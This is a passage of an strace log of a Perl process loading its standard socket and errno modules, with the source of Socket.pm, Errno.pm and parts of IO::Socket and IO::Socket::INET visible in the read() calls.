8423  07:23:22.854910 stat64("/etc/perl/Socket.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.854923 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.854936 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.854950 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.854963 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.854977 stat64("/usr/lib/perl5/Socket.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.854989 stat64("/usr/lib/perl5/Socket.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.855002 stat64("/usr/share/perl5/Socket.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.855014 stat64("/usr/share/perl5/Socket.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.855027 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.855040 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
8423  07:23:22.855060 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
8423  07:23:22.855075 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5a218) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.855086 _llseek(8, 0, [0], SEEK_CUR) = 0
8423  07:23:22.855104 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
8423  07:23:22.855546 brk(0x8239000)    = 0x8239000
8423  07:23:22.855803 read(8, "", 4096) = 0
8423  07:23:22.855820 close(8)          = 0
8423  07:23:22.855908 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
8423  07:23:22.855933 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
8423  07:23:22.855960 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
8423  07:23:22.855975 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
8423  07:23:22.856071 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
8423  07:23:22.856090 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7da5000
8423  07:23:22.856103 mmap2(0xb7daa000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7daa000
8423  07:23:22.856159 close(8)          = 0
8423  07:23:22.856771 brk(0x825a000)    = 0x825a000
8423  07:23:22.856922 stat64("/etc/perl/Errno.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.856939 stat64("/etc/perl/Errno.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.856953 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.856966 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.856980 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.856993 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.857007 stat64("/usr/lib/perl5/Errno.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.857019 stat64("/usr/lib/perl5/Errno.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.857032 stat64("/usr/share/perl5/Errno.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.857044 stat64("/usr/share/perl5/Errno.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.857057 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.857070 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
8423  07:23:22.857091 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
8423  07:23:22.857117 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5a218) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.857157 _llseek(8, 0, [0], SEEK_CUR) = 0
8423  07:23:22.857192 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
8423  07:23:22.857955 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
8423  07:23:22.858418 _llseek(8, 5966, [5966], SEEK_SET) = 0
8423  07:23:22.858436 _llseek(8, 0, [5966], SEEK_CUR) = 0
8423  07:23:22.858447 close(8)          = 0
8423  07:23:22.858840 brk(0x827b000)    = 0x827b000
8423  07:23:22.858969 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
8423  07:23:22.859350 _llseek(6, 6698, [6698], SEEK_SET) = 0
8423  07:23:22.859366 _llseek(6, 0, [6698], SEEK_CUR) = 0
8423  07:23:22.859377 close(6)          = 0
8423  07:23:22.859397 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.859412 stat64("/etc/perl/IO/Socket/INET.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.859437 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.859477 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.859499 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.859529 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.859548 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.859561 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.859575 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.859587 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.859601 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.859615 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
8423  07:23:22.859637 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
8423  07:23:22.859652 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5a6c8) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.859664 _llseek(6, 0, [0], SEEK_CUR) = 0
8423  07:23:22.859682 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, 